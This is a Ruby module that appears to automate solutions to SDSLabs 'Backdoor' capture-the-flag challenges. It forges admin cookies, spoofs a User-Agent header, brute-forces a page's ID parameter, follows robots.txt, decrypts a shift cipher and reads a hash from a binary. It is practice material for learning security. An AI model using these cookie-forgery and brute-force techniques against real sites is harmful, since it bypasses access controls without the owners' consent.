# frozen_string_literal: true

require 'net/http'
require 'digest'
require 'zip'
require 'stringio'

module Backdoor
  ##
  # Challenge
  class Challenge
    def initialize(shell)
      @shell = shell
    end

    def exist?(name)
      ChallengeBase.successors.any? { |s| s::NAME == name }
    end

    def list
      ChallengeBase.successors.map { |s| s::NAME }.sort
    end

    def run(name, args)
      challenge = ChallengeBase.successors.detect { |s| s::NAME == name }
      raise ArgumentError, 'No such challenge' unless challenge

      challenge.new(@shell, args[1..]).exec
    rescue FoundError
    end
  end

  ##
  # ChallengeBase
  class ChallengeBase
    @successors = []

    class << self
      attr_reader :successors

      def inherited(subclass)
        super
        @successors << subclass
      end
    end

    def initialize(shell, args)
      @shell = shell
      @args = args

      @client_static = ClientStatic.new

      @logger = Logger.new(@shell.output, self.class::NAME)
    end

    def exec; end

    def found(message)
      @logger.puts("Found: #{message}")
      raise FoundError
    end

    def not_found
      @logger.puts('Not found')
      raise FoundError
    end
  end

  ##
  # Challenge 2013-bin-50
  class Challenge2013bin50 < ChallengeBase
    NAME = '2013-bin-50'

    FILE = '/2013-BIN-50/binary50.zip'
    OFFSET = 0x87e

    def exec
      @logger.puts("Downloading #{FILE}")
      file = @client_static.get(FILE).body

      zip_stream = Zip::InputStream.new(StringIO.new(file))
      entry = zip_stream.get_next_entry
      @logger.puts("Unzipping #{entry}")

      @logger.puts("Reading MD5 hash from offset 0x#{OFFSET.to_s(16)}")
      hash = String.new
      entry = StringIO.new(entry.get_input_stream.read)
      entry.seek(OFFSET)
      8.times do
        data = entry.read(7)
        hash << data[0..3]
      end

      @logger.puts("Calculating SHA256 hash from MD5 hash #{hash}")
      hash = Digest::SHA256.hexdigest(hash)
      found(hash)
    rescue HTTPError => e
      @logger.puts(e)
    end
  end

  ##
  # Challenge CPHR
  class ChallengeCPHR < ChallengeBase
    NAME = 'cphr'

    FILE = '/CPHR/index.html'
    ALPHABET = ('a'..'z').to_a
    TEXT = 'the flag is'

    def exec
      @logger.puts("Getting encrypted text #{FILE}")
      data = @client_static.get(FILE).body
      match = %r{<div>\s+(.+)\s+</div>}.match(data)
      data = match[1].clone
      @logger.puts(data)

      @logger.puts('Searching offsets')
      offsets = []
      TEXT.chars.each_with_index do |char, i|
        next unless ALPHABET.include?(char)

        a = ALPHABET.index(data[i])
        b = ALPHABET.index(char)
        n = a - b
        break if offsets.first == n

        offsets << n
      end
      @logger.puts("Offsets: #{offsets}")

      @logger.puts('Decrypting text')
      text = String.new
      enum = offsets.cycle
      data.each_char do |char|
        unless ALPHABET.include?(char)
          text << char
          next
        end

        n = ALPHABET.index(char)
        text << ALPHABET[(n - enum.next) % ALPHABET.length]
      end

      found(text)
    end
  end

  ##
  # Challenge 2013-web-50
  class Challenge2013web50 < ChallengeBase
    NAME = '2013-web-50'

    PORT = 10_003

    def exec
      client = ClientWeb.new(PORT)
      response = client.get(
        '/',
        cookies: { 'username' => 'admin' }
      )

      found(response.body)
    end
  end

  ##
  # Challenge 2013-misc-75
  class Challenge2013misc75 < ChallengeBase
    NAME = '2013-misc-75'

    PORT = 10_001

    def exec
      client = ClientWeb.new(PORT)
      @logger.puts('Getting a number')
      response = client.get('/')
      not_found unless response.body =~ /Find the sum of First (\d+) prime numbers/
      number = Regexp.last_match(1).to_i
      @logger.puts(number)
      answer = primes(number).sum
      @logger.puts("Sending answer: #{answer}")
      response = client.post(
        '/',
        data: { 'answer' => answer }
      )

      found(response.body)
    end

    private

    def primes(n)
      raise ArgumentError, 'Number must be greater or equal 2' unless n >= 2

      numbers = []
      (2..n).each do |i|
        p = true
        (2...i).each do |j|
          next unless (i % j).zero?

          p = false
          break
        end

        next unless p

        numbers << i
      end

      numbers
    end
  end

  ##
  # Challenge CK
  class ChallengeCK < ChallengeBase
    NAME = 'ck'

    PORT = 11_007

    def exec
      client = ClientWeb.new(PORT)
      response = client.get(
        '/',
        cookies: { 'admin' => 1 }
      )

      not_found unless response.body =~ /flag is (\w+)/
      found(Regexp.last_match(1))
    end
  end

  ##
  # Challenge BRWSR
  class ChallengeBRWSR < ChallengeBase
    NAME = 'brwsr'

    PORT = 11_010

    def exec
      client = ClientWeb.new(PORT)
      response = client.get(
        '/',
        headers: { 'User-Agent' => 'SDSLabs browser' }
      )

      not_found unless response.body =~ /flag for you: (\w+)/
      found(Regexp.last_match(1))
    end
  end

  ##
  # Challenge Batman
  class ChallengeBatman < ChallengeBase
    NAME = 'batman'

    PORT = 11_004

    def exec
      client = ClientWeb.new(PORT)
      @logger.puts('Bruteforcing ID')
      100.times do |i|
        @logger.puts(i)
        response = client.get("/?st=#{i}")
        next unless response.body =~ /Flag is "(.+)"/

        found(Regexp.last_match(1))
        break
      end

      not_found
    end
  end

  ##
  # Challenge Robot
  class ChallengeRobot < ChallengeBase
    NAME = 'robot'

    PATH = '/ROBOT'
    ROBOTS = 'robots.txt'

    def exec
      @logger.puts("Getting #{ROBOTS}")
      response = @client_static.get(File.join(PATH, ROBOTS))
      not_found unless response.body =~ /Disallow: (.*)/

      path = File.join(PATH, Regexp.last_match(1))
      @logger.puts("Getting #{path}")
      response = @client_static.get(path)
      found(response.body)
    end
  end

  ##
  # Found error
  class FoundError < StandardError; end
end
